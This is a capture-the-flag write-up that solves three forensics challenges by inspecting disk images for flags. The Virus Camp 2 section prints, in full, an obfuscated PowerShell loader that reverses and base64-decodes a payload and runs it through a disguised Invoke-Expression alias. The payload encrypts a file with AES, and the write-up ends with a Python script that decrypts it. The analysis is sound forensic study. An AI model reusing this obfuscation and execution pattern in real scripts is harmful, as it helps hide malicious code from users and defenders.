---
description: 3 - Baby DFIR , Virus Camp 1 , Virus Camp 2
---

# DFIR

## Baby DFIR

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

we get a `abc.ad1` file , if we open it in FTK Imager, we clearly see a flag.txt which shows us the flag.&#x20;

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

## Virus Camp 2

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

There were 2 parts to this, since I found the flag for the 2nd part first, I'll write it this way. We do see a `flag.enc` file in desktop, there weren't anything much apart from common files in every other folder. I decided to have a look into `AppData`, and first thought of checking Powershell history and found this

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

We see a `temp0001.ps1` file being run. Upon finding it, we see that it is obfuscated&#x20;

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

```powershell
$wy7qIGPnm36HpvjrL2TMUaRbz = "K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ" ;
$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2>&1> $null ;
$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
$9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;
```

We clearly see its doing a reverse and then base64 decode. I used cyberchef for the same.

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

So it uses `AES` to encrypt the flag.png to flag.enc , we know the key is `MyS3cr3tP4ssw0rd`. We can export the flag.enc to our desired location and write a python code to decrypt it.

```python
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

password = b"MyS3cr3tP4ssw0rd"
salt = bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08])
iterations = 10000
key_size = 32
iv_size = 16

key_iv = PBKDF2(password, salt, dkLen=key_size + iv_size, count=iterations)
key, iv = key_iv[:key_size], key_iv[key_size:key_size + iv_size]

cipher = AES.new(key, AES.MODE_CBC, iv)

with open("C:\\Users\\Admin\\Downloads\\bitsctf\\flag.enc", "rb") as f:
    encrypted_bytes = f.read()

decrypted_bytes = cipher.decrypt(encrypted_bytes)

with open("C:\\Users\\Admin\\Downloads\\bitsctf\\flag_decrypted.png", "wb") as f:
    f.write(decrypted_bytes)
```

After running this , we see a new file and opening it, we get the flag

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

## Virus Camp 1

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Now once again I started looking for suspicious artifacts  and found a file `extension.js` in the `.vscode` folder which reveals our 1st flag

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

There is an interesting long base64 string in the comment and after decoding it, we get our flag

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

And that's it ig, there weren't many `DFIR` challenges unfortunately and to make things worse, the forensics challenges were all just steganography (I have skill issue ig).&#x20;
